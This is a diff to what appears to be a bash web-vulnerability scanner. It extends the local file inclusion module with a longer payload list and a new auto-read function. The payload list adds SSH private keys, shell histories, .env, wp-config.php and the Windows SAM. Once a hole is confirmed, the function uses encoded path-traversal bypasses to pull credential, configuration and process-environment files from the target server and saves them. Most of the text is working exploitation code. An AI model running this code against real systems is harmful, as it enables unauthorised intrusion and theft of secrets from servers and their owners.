@@ -80,18 +80,43 @@ _lfi_level5() {
 /proc/self/fd/2
 /proc/version
 /proc/self/status
+/proc/self/cgroup
+/proc/self/mounts
+/proc/net/tcp
+/proc/sched_debug
 /var/log/apache2/access.log
 /var/log/apache/access.log
 /var/log/nginx/access.log
 /var/log/httpd/access_log
 /var/log/auth.log
 /var/log/syslog
+/var/log/mail.log
+/var/log/vsftpd.log
 /etc/shadow
 /etc/hostname
 /etc/issue
+/etc/crontab
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/php/8.2/fpm/php.ini
+/etc/php/8.1/fpm/php.ini
+/etc/php/7.4/fpm/php.ini
+/etc/mysql/my.cnf
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/www-data/.bash_history
+/var/www/html/.env
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.htaccess
 ..\..\..\..\windows\system32\drivers\etc\hosts
 ..\..\..\..\inetpub\wwwroot\web.config
 ..\..\..\..\windows\system.ini
+..\..\..\..\windows\repair\SAM
+..\..\..\..\windows\win.ini
 WEB-INF/web.xml
 META-INF/MANIFEST.MF
 EOF
@@ -281,7 +306,100 @@ LFIEOF
 
     # Terminal alert
     echo -e "\033[1;33m  [!!] LFI: ${url} (${param}) [$confidence] signals=${best_signals} encoding=${best_encoding}${found_depth:+ depth=$found_depth}\033[0m" >&2
+
+    # ── STEP 5: AUTO-READ INTERESTING FILES ──
+    if $confirmed; then
+      _lfi_auto_read "$url" "$param" "$best_payload" "$method" "$outdir"
+    fi
   fi
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  AUTO-READ: When LFI is confirmed, read high-value files & display content
+# ═══════════════════════════════════════════════════════════════════════════
+_lfi_auto_read() {
+  local url="$1" param="$2" working_payload="$3" method="$4" outdir="$5"
+  local lfi_reads_dir="${outdir}/lfi_reads"
+  mkdir -p "$lfi_reads_dir"
+
+  # Extract the bypass pattern from the working payload
+  local bypass_prefix=""
+  if [[ "$working_payload" == *"....//..../"* ]]; then
+    bypass_prefix="....//....//....//....//....//....//....//....//....//..../"
+  elif [[ "$working_payload" == *"..%2f"* ]]; then
+    bypass_prefix="..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+  elif [[ "$working_payload" == *"..%252f"* ]]; then
+    bypass_prefix="..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f"
+  elif [[ "$working_payload" == *"..%c0%af"* ]]; then
+    bypass_prefix="..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af"
+  elif [[ "$working_payload" == *"..;/"* ]]; then
+    bypass_prefix="..;/..;/..;/..;/..;/..;/..;/..;/"
+  else
+    # Standard traversal
+    bypass_prefix="../../../../../../../../../../../../"
+  fi
+
+  # High-value targets
+  local -a targets_unix=(
+    "etc/passwd"
+    "etc/hostname"
+    "etc/os-release"
+    "etc/nginx/nginx.conf"
+    "etc/nginx/sites-enabled/default"
+    "etc/apache2/apache2.conf"
+    "etc/apache2/sites-enabled/000-default.conf"
+    "proc/self/environ"
+    "proc/self/cmdline"
+    "proc/version"
+  )
+  local -a targets_php=(
+    "var/www/html/index.php"
+    "var/www/html/config.php"
+    "var/www/html/.env"
+    "var/www/html/wp-config.php"
+  )
+  local -a targets_win=(
+    "windows/win.ini"
+    "windows/system32/drivers/etc/hosts"
+  )
+
+  echo -e "\033[1;36m  ┌─── LFI Auto-Read Results ───────────────────────────\033[0m" >&2
+  local files_read=0
+
+  # Decide which targets to try
+  local all_targets=("${targets_unix[@]}")
+  local framework="${FRAMEWORK:-generic}"
+  [[ "$framework" =~ ^(php|wordpress|laravel|drupal|joomla|symfony)$ ]] && all_targets+=("${targets_php[@]}")
+
+  for target_file in "${all_targets[@]}"; do
+    local payload="${bypass_prefix}${target_file}"
+    local resp_file="${lfi_reads_dir}/$(echo "$target_file" | tr '/' '_').txt"
+    _lfi_request "$url" "$param" "$payload" "$method" "$resp_file" > /dev/null 2>&1
+
+    local fsize=0
+    [[ -f "$resp_file" ]] && fsize=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
+    if [[ "$fsize" -gt 10 ]]; then
+      # Verify it's not the same as baseline (actual file content vs error page)
+      local sig_type=""
+      sig_type=$(_lfi_check_signatures "$resp_file" 2>/dev/null) || true
+      if [[ -n "$sig_type" ]] || [[ "$fsize" -gt 50 ]]; then
+        ((files_read++)) || true
+        local preview; preview=$(strings "$resp_file" 2>/dev/null | head -8)
+        echo -e "\033[1;32m  │ /$target_file\033[0m \033[2m(${fsize} bytes)\033[0m" >&2
+        echo "$preview" | while IFS= read -r line; do
+          echo -e "\033[2m  │   ${line}\033[0m" >&2
+        done
+      fi
+    fi
+  done
+
+  echo -e "\033[1;36m  └─── ${files_read} files read ────────────────────────────\033[0m" >&2
+
+  # Save summary
+  echo "LFI confirmed: $url ($param)" > "${lfi_reads_dir}/summary.txt"
+  echo "Working payload pattern: $bypass_prefix" >> "${lfi_reads_dir}/summary.txt"
+  echo "Files successfully read: $files_read" >> "${lfi_reads_dir}/summary.txt"
+  ls -la "$lfi_reads_dir"/*.txt 2>/dev/null | awk '{print $NF, $5 " bytes"}' >> "${lfi_reads_dir}/summary.txt"
 }
 
 # ── HTTP request helper (returns status|size|time) ──────────────────────────
